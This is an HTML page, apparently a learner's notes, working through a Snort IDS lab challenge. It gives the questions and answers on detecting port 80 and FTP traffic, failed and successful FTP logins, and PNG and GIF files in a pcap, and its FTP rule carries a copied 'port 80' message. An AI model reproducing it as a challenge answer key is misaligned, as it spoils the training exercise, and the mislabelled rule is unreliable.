@@ -1,0 +1,730 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SNORT CHALLENGE 1</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="22a5b2cc-075b-8052-8e89-dcd0414bf8cf" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🐷</span></div><h1 class="page-title">SNORT CHALLENGE 1</h1><p class="page-description"></p></header><div class="page-body"><figure id="22b5b2cc-075b-80a0-9150-cee31513d6e1" class="image"><a href="image%2082.png"><img style="width:710px" src="image%2082.png"/></a></figure><h1 id="22a5b2cc-075b-8003-b690-f84133b444f6" class="">HTTP</h1><ol type="1" id="22a5b2cc-075b-80b2-a975-d1eeb578b33b" class="numbered-list" start="1"><li>Write a rule to detect all TCP packets <strong>from or to</strong> port 80. What is the number of detected packets you got?</li></ol><p id="22a5b2cc-075b-80c0-a6f7-c5c76f467390" class=""><code>alert tcp any 80 &lt;&gt; any any (msg:&quot;TCP traffic to/from port 80 detected&quot;; sid:10000003; rev:1;)</code></p><figure id="22a5b2cc-075b-8062-8a35-dd35328ca1d5" class="image"><a href="D909DCF5-258B-4516-AFE9-475209A13DD9.png"><img style="width:592.9698486328125px" src="D909DCF5-258B-4516-AFE9-475209A13DD9.png"/></a></figure><figure id="22a5b2cc-075b-80bc-8b82-d156e75a4a85" class="image"><a href="F837BC27-F112-4FB7-AE53-0D0F065B35DD.png"><img style="width:592.9698486328125px" src="F837BC27-F112-4FB7-AE53-0D0F065B35DD.png"/></a></figure><p id="22a5b2cc-075b-806a-b03c-f8c239eaafa7" class="">
+</p><ol type="1" id="22a5b2cc-075b-80bd-baca-ea3ab098c127" class="numbered-list" start="2"><li>What is the dst address of packet 63 ?</li></ol><p id="22a5b2cc-075b-808b-baa0-efa84c47a292" class="">i have snort log of the previous commands, I ll use snort to read it with the -n fag to read upto 63 packets</p><p id="22a5b2cc-075b-805d-a26f-df9d891d8183" class=""><code>sudo snort -r snort.log.1751998854 -n 63</code></p><figure id="22a5b2cc-075b-8042-b41b-f58b00e45a3b" class="image"><a href="671BAEB0-40BC-470C-96C1-E767B88A422E.png"><img style="width:580.6415405273438px" src="671BAEB0-40BC-470C-96C1-E767B88A422E.png"/></a></figure><p id="22a5b2cc-075b-8029-b388-e5ec3eb2932a" class="">
+</p><ol type="1" id="22a5b2cc-075b-8028-987a-c44d7e174ef1" class="numbered-list" start="3"><li>What i the ack number of packet 64</li></ol><p id="22a5b2cc-075b-8064-bff0-d67d7ae5c71c" class="">Same as the previous command but with -n 64</p><p id="22a5b2cc-075b-808e-ac38-f94f65460583" class=""><code>sudo snort -r snort.log.1751998854 -n 64</code></p><figure id="22a5b2cc-075b-802d-804d-d73cae3ee07b" class="image"><a href="C3ABC87B-BD2E-44E7-A426-818BA7D9F416.png"><img style="width:580.618896484375px" src="C3ABC87B-BD2E-44E7-A426-818BA7D9F416.png"/></a></figure><p id="22a5b2cc-075b-80ad-a638-f2c0b10934ee" class="">
+</p><ol type="1" id="22a5b2cc-075b-80e1-a653-edad06bd2687" class="numbered-list" start="4"><li>What is the SEQ number of packet 62?</li></ol><p id="22a5b2cc-075b-80b3-b8d2-c1f173e1262d" class="">From previous output, I can read packet 62</p><figure id="22a5b2cc-075b-801c-ba7d-f6eb412471d9" class="image"><a href="image%2083.png"><img style="width:580.6415405273438px" src="image%2083.png"/></a></figure><p id="22a5b2cc-075b-805b-93b4-febec2aa5794" class="">
+</p><ol type="1" id="22a5b2cc-075b-8071-a422-fb0d79c8597c" class="numbered-list" start="5"><li>What is the source IP of packet 65 ?</li></ol><p id="22a5b2cc-075b-807c-8abd-ea7f54c03800" class=""><code>sudo snort -r snort.log.1751998854 -n 65</code></p><figure id="22a5b2cc-075b-80af-bf42-eb287c4ba56e" class="image"><a href="3DB148BD-7F24-4D5B-AC91-9F68257CBE37.png"><img style="width:580.6302490234375px" src="3DB148BD-7F24-4D5B-AC91-9F68257CBE37.png"/></a></figure><p id="22a5b2cc-075b-80fb-bbd4-f425f71dfd6e" class="">
+</p><h1 id="22a5b2cc-075b-8014-8b8c-d3ccf4931af0" class="">FTP</h1><ol type="1" id="22a5b2cc-075b-809a-b4a8-e77abb241391" class="numbered-list" start="1"><li>Write a <strong>single</strong> rule to detect &quot;<strong>all TCP port 21</strong>&quot;  traffic in the given pcap.<br/><br/><code>snort -c /etc/snort/rules/local.rules -A full -l . -r ftp-png-gif.pcap</code></li></ol><p id="22a5b2cc-075b-80c4-86dc-c3f2de7160d2" class=""><code>alert tcp any 21 &lt;&gt; any any (msg:&quot;TCP traffic to/from port 80 detected&quot;; sid:10000003; rev:1;)</code></p><figure id="22a5b2cc-075b-804b-9b72-e5904c00b72d" class="image"><a href="C37B4F01-650E-4A69-8AA3-9969EDCDFE9C.png"><img style="width:580.6528930664062px" src="C37B4F01-650E-4A69-8AA3-9969EDCDFE9C.png"/></a></figure><p id="22a5b2cc-075b-80a2-9ba4-dc140f5922a8" class="">
+</p><ol type="1" id="22a5b2cc-075b-80fa-ab22-e692999c7197" class="numbered-list" start="2"><li>What is the FTP service name?</li></ol><p id="22a5b2cc-075b-8089-a69c-d052f3aa5178" class="">i used <code>sudo snort -r snort.log.1751999950 -X</code> to get more information from packets, and by reading through the first few packets, i found the following</p><figure id="22a5b2cc-075b-8090-b580-c8836adc2674" class="image"><a href="3CBCE9CF-88E0-457B-8F92-5BFC15148003.png"><img style="width:580.6302490234375px" src="3CBCE9CF-88E0-457B-8F92-5BFC15148003.png"/></a></figure><p id="22a5b2cc-075b-800e-9f20-f173d2535516" class="">
+</p><ol type="1" id="22a5b2cc-075b-80e6-b5a0-ebc2d602b985" class="numbered-list" start="3"><li>Write a rule to detect failed FTP login attempts in the given pcap.</li></ol><p id="22a5b2cc-075b-80e8-a828-c670873c6732" class=""><a href="https://techcommunity.microsoft.com/blog/iis-support-blog/ftp-%E2%80%9C530-user-cannot-log-in%E2%80%9D-error-and-solution/364570">https://techcommunity.microsoft.com/blog/iis-support-blog/ftp-%E2%80%9C530-user-cannot-log-in%E2%80%9D-error-and-solution/364570</a></p><figure id="22a5b2cc-075b-80a8-9172-f15b87fd9909" class="image"><a href="415A7A91-DEA9-4F4D-AB43-972C06E01B55.png"><img style="width:580.4830932617188px" src="415A7A91-DEA9-4F4D-AB43-972C06E01B55.png"/></a></figure><p id="22a5b2cc-075b-800f-8a2b-cb72d282e2f2" class="">from a few research and also from the previous outputs, I noticed that all failed login attempts will have a “530 User xxx” error, so I added that as content.</p><figure id="22a5b2cc-075b-8035-a181-c5369134ad5f" class="image"><a href="7CA8E2D9-32DD-42D9-B03B-BCC198960E11.png"><img style="width:580.6528930664062px" src="7CA8E2D9-32DD-42D9-B03B-BCC198960E11.png"/></a></figure><p id="22a5b2cc-075b-80ec-bb4b-ebc740d948eb" class="">
+</p><ol type="1" id="22a5b2cc-075b-80cf-91e6-c14f718d38ce" class="numbered-list" start="4"><li>Write a rule to detect successful FTP logins in the given pcap.</li></ol><p id="22a5b2cc-075b-807e-8f7d-d573e9da369b" class="">Successful login should have a message as well, I found out that “230 User” is the message for successful logins</p><p id="22a5b2cc-075b-80c9-b0d2-c53fa3f0679b" class=""><a href="https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/ftp-administration-management/ftp-status-codes-iis-7-and-later-versions">https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/ftp-administration-management/ftp-status-codes-iis-7-and-later-versions</a></p><figure id="22a5b2cc-075b-8009-b7b5-f38adf0041a9" class="image"><a href="859040FB-7DC6-45E8-BA03-458F23A93A9F.png"><img style="width:580.6415405273438px" src="859040FB-7DC6-45E8-BA03-458F23A93A9F.png"/></a></figure><figure id="22a5b2cc-075b-805b-beb8-e3b3be6db82c" class="image"><a href="BD52BB62-8A65-435B-84A4-C6F23EEE3C09.png"><img style="width:580.618896484375px" src="BD52BB62-8A65-435B-84A4-C6F23EEE3C09.png"/></a></figure><figure id="22a5b2cc-075b-8057-afbe-ce4ed5ea8302" class="image"><a href="5C0EE818-6406-47AD-AF30-DC279B878A4C.png"><img style="width:580.6415405273438px" src="5C0EE818-6406-47AD-AF30-DC279B878A4C.png"/></a></figure><p id="22a5b2cc-075b-80f4-8469-d40aeb13e10d" class="">
+</p><ol type="1" id="22a5b2cc-075b-804c-9637-e56dca2502b7" class="numbered-list" start="5"><li>Write a rule to detect FTP login attempts with a valid username but no password entered yet.</li></ol><figure id="22a5b2cc-075b-802b-ac77-ef7000492edf" class="image"><a href="image%2084.png"><img style="width:580.6302490234375px" src="image%2084.png"/></a></figure><figure id="22a5b2cc-075b-8072-a8da-f355d8714f9c" class="image"><a href="00E2CCF7-9CC7-4F9C-A57A-881C57D0C6CD.png"><img style="width:580.6415405273438px" src="00E2CCF7-9CC7-4F9C-A57A-881C57D0C6CD.png"/></a></figure><p id="22a5b2cc-075b-80b8-9524-d000c82f1128" class="">
+</p><ol type="1" id="22a5b2cc-075b-803d-8a97-ccdf732b9b8f" class="numbered-list" start="6"><li>Write a rule to detect FTP login attempts with the &quot;Administrator&quot; username but no password entered yet.</li></ol><figure id="22a5b2cc-075b-8023-bae4-eb4c9fa725b4" class="image"><a href="image%2085.png"><img style="width:580.6076049804688px" src="image%2085.png"/></a></figure><figure id="22a5b2cc-075b-806a-810f-c0f0d64eafa0" class="image"><a href="48CCF7AC-1687-41A7-AC63-022DDE10BE42.png"><img style="width:580.6528930664062px" src="48CCF7AC-1687-41A7-AC63-022DDE10BE42.png"/></a></figure><p id="22a5b2cc-075b-80f9-8c26-fee71067fe2d" class="">
+</p><p id="22a5b2cc-075b-80d8-b8ea-d778694b5472" class="">
+</p><h1 id="22a5b2cc-075b-803b-8743-c431cbbde0bb" class="">IDS Rules PNG</h1><ol type="1" id="22a5b2cc-075b-8077-ac20-cf2b36103546" class="numbered-list" start="1"><li>Write a rule to detect the PNG file in the given pcap. Investigate the logs and identify the software name embedded in the packet.</li></ol><p id="22a5b2cc-075b-8053-8f47-c4033f52a95b" class="">in order to find the png in pcap, I had to search for png magic bytes</p><figure id="22a5b2cc-075b-8033-94c4-cac36c989f74" class="image"><a href="5549826C-B450-42BC-84DC-5034B580FB5E.png"><img style="width:580.6415405273438px" src="5549826C-B450-42BC-84DC-5034B580FB5E.png"/></a></figure><p id="22a5b2cc-075b-8013-854a-c6c508a0d871" class="">then i Wrote a snort rule as following,</p><figure id="22a5b2cc-075b-8039-866a-d52965e25e2c" class="image"><a href="4EA0632D-E7D0-46AD-9BD2-CA2D5C04A48D.png"><img style="width:580.6302490234375px" src="4EA0632D-E7D0-46AD-9BD2-CA2D5C04A48D.png"/></a></figure><p id="22a5b2cc-075b-8041-8758-d3a403387193" class="">ran the rule against the pcap, then ready the log file with -X to see the following in HEX.</p><figure id="22a5b2cc-075b-803c-b464-d219069a8233" class="image"><a href="image%2086.png"><img style="width:580.6302490234375px" src="image%2086.png"/></a></figure><p id="22a5b2cc-075b-8061-9379-f4df53389ac5" class="">
+</p><ol type="1" id="22a5b2cc-075b-80cf-88a8-c8678e910337" class="numbered-list" start="2"><li>Write a rule to detect the GIF file in the given pcap. Investigate the logs and identify the image format embedded in the packet.</li></ol><p id="22a5b2cc-075b-8012-ab49-c42be5a654ee" class="">I found out that there are 2 types of GIF. </p><figure id="22a5b2cc-075b-8094-b0a3-d1454cbb9bf1" class="image"><a href="2B170694-8629-4277-802B-65C7ECF8C2C3.png"><img style="width:580.6528930664062px" src="2B170694-8629-4277-802B-65C7ECF8C2C3.png"/></a></figure><p id="22a5b2cc-075b-803a-9d1c-d7f4fbc4dfad" class=""><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types#mime_sniffing">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types#mime_sniffing</a></p><figure id="22a5b2cc-075b-8056-a7f6-dcb5111185cd" class="image"><a href="image%2087.png"><img style="width:580.6528930664062px" src="image%2087.png"/></a></figure><p id="22a5b2cc-075b-805b-94e4-c2e1cf2f6ec0" class="">
